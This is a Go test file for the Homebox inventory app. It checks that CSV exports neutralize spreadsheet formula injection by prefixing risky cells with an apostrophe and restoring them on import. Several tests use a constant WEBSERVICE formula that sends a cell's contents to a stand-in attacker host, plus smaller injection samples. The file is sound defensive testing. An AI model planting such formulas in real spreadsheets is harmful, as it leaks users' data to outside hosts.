package reporting

import (
	"bytes"
	"encoding/csv"
	"reflect"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/sysadminsmedia/homebox/backend/internal/data/repo"
)

const webserviceFormula = `=WEBSERVICE("http://attacker.example/?d="&B2)`

func TestNeutralizeCSVCell(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{"", ""},
		{"Drill", "Drill"},
		{"a=b", "a=b"},
		{"=1+1", "'=1+1"},
		{"+1", "'+1"},
		{"-20°C Freezer", "'-20°C Freezer"},
		{"@SUM(A1)", "'@SUM(A1)"},
		{"\tcmd", "'\tcmd"},
		{"\rcmd", "'\rcmd"},
		{webserviceFormula, "'" + webserviceFormula},
		// Values that already look neutralized are escaped again so the
		// import side can tell them apart from our own prefix.
		{"'=1+1", "''=1+1"},
		{"''=1+1", "'''=1+1"},
		{"'plain", "'plain"},
		{"'", "'"},
		{"''", "''"},
	}

	for _, tt := range tests {
		assert.Equal(t, tt.want, neutralizeCSVCell(tt.in), "neutralize(%q)", tt.in)
	}
}

func TestRestoreCSVCell_RoundTrip(t *testing.T) {
	values := []string{
		"", "Drill", "'", "'plain", "''", "''plain", "=1+1", "'=1+1", "''=1+1", "'''-x",
		"-5", "+", "@", "\t", "-20°C Freezer", webserviceFormula,
	}

	for _, v := range values {
		assert.Equal(t, v, restoreCSVCell(neutralizeCSVCell(v)), "round trip %q", v)
	}
}

func TestSheet_ExportNeutralizesFormulasAndReimports(t *testing.T) {
	headers := []string{}
	st := reflect.TypeOf(ExportCSVRow{})
	for i := 0; i < st.NumField(); i++ {
		if tag := st.Field(i).Tag.Get("csv"); tag != "" && tag != "-" {
			headers = append(headers, primaryCSVTag(tag))
		}
	}
	headers = append(headers, "HB.field.Note")

	original := ExportCSVRow{
		Name:          webserviceFormula,
		Description:   "-20°C Freezer",
		SerialNumber:  "@SUM(A1)",
		Location:      LocationString{"=Garage", "Shelf"},
		TagStr:        TagString{"+Tag"},
		Fields:        []ExportItemFields{{Name: "Note", Value: "=HYPERLINK(\"x\")"}},
		AssetID:       repo.AssetID(1),
		Quantity:      1,
		PurchasePrice: -5,
	}

	sheet := &IOSheet{headers: headers, Rows: []ExportCSVRow{original}}
	out, err := sheet.CSV()
	require.NoError(t, err)

	cell := func(header string) string {
		col, ok := sheet.GetColumn(header)
		require.True(t, ok, header)
		return out[1][col]
	}

	assert.Equal(t, "'"+webserviceFormula, cell("HB.name"))
	assert.Equal(t, "'-20°C Freezer", cell("HB.description"))
	assert.Equal(t, "'@SUM(A1)", cell("HB.serial_number"))
	assert.Equal(t, "'=Garage / Shelf", cell("HB.location"))
	assert.Equal(t, "'+Tag", cell("HB.tags"))
	assert.Equal(t, "'=HYPERLINK(\"x\")", cell("HB.field.Note"))
	assert.Equal(t, "-5", cell("HB.purchase_price"), "numeric cells must not be escaped")

	var buf bytes.Buffer
	require.NoError(t, csv.NewWriter(&buf).WriteAll(out))

	imported := &IOSheet{}
	require.NoError(t, imported.Read(&buf))
	require.Len(t, imported.Rows, 1)

	got := imported.Rows[0]
	assert.Equal(t, original.Name, got.Name)
	assert.Equal(t, original.Description, got.Description)
	assert.Equal(t, original.SerialNumber, got.SerialNumber)
	assert.Equal(t, original.Location, got.Location)
	assert.Equal(t, original.TagStr, got.TagStr)
	assert.Equal(t, original.Fields, got.Fields)
	assert.InDelta(t, original.PurchasePrice, got.PurchasePrice, 0)
}

func TestBillOfMaterialsCSV_NeutralizesFormulas(t *testing.T) {
	out, err := BillOfMaterialsCSV([]repo.EntityOut{{
		EntitySummary: repo.EntitySummary{
			Name:          webserviceFormula,
			Description:   "+cmd",
			Quantity:      2,
			PurchasePrice: -5,
		},
		Manufacturer: "@vendor",
		SerialNumber: "-123",
		ModelNumber:  "\tmodel",
	}})
	require.NoError(t, err)

	rows, err := csv.NewReader(bytes.NewReader(out)).ReadAll()
	require.NoError(t, err)
	require.Len(t, rows, 2)

	cell := func(header string) string {
		for i, h := range rows[0] {
			if h == header {
				return rows[1][i]
			}
		}
		t.Fatalf("missing column %q in %v", header, rows[0])
		return ""
	}

	assert.Equal(t, "'"+webserviceFormula, cell("Name"))
	assert.Equal(t, "'+cmd", cell("Description"))
	assert.Equal(t, "'@vendor", cell("Manufacturer"))
	assert.Equal(t, "'-123", cell("Serial Number"))
	assert.Equal(t, "'\tmodel", cell("Model Number"))
	assert.Equal(t, "-5", cell("Price"), "numeric cells must not be escaped")
}
